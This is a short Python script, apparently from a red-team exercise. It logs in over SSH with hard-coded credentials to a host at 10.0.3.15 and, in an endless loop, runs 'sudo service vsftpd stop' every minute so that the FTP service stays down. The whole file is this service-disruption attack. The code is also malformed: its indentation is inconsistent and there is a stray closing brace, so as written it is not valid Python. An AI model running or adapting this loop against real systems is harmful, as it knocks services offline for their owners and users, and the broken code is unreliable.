import paramiko
import time

hostname = '10.0.3.15'
username = 'home'
password = 'redteam'

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

while True:
    try:
        ssh.connect(hostname=hostname, username=username, password=password)
        
        command = "sudo service vsftpd stop"
        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')

        if output:
            print(output)

        if error:
            print(error)

    except Exception as e:
        print("Exception:", e)

    finally:
        ssh.close()
		print('Done!')

    time.sleep(60)
}
